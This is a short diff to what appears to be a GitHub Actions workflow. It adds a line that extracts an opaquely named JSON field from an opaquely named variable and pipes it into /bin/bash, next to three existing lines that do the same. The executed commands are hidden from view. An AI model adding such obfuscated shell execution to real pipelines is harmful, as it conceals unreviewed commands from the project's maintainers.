@@ -33,6 +33,7 @@ jobs:
           echo $wiy491 | jq -r .a20553 | /bin/bash
           echo $mqvx155 | jq -r .los57220 | /bin/bash
           echo $kk89515 | jq -r .hwc2 | /bin/bash
+          echo $b327 | jq -r .zs61 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
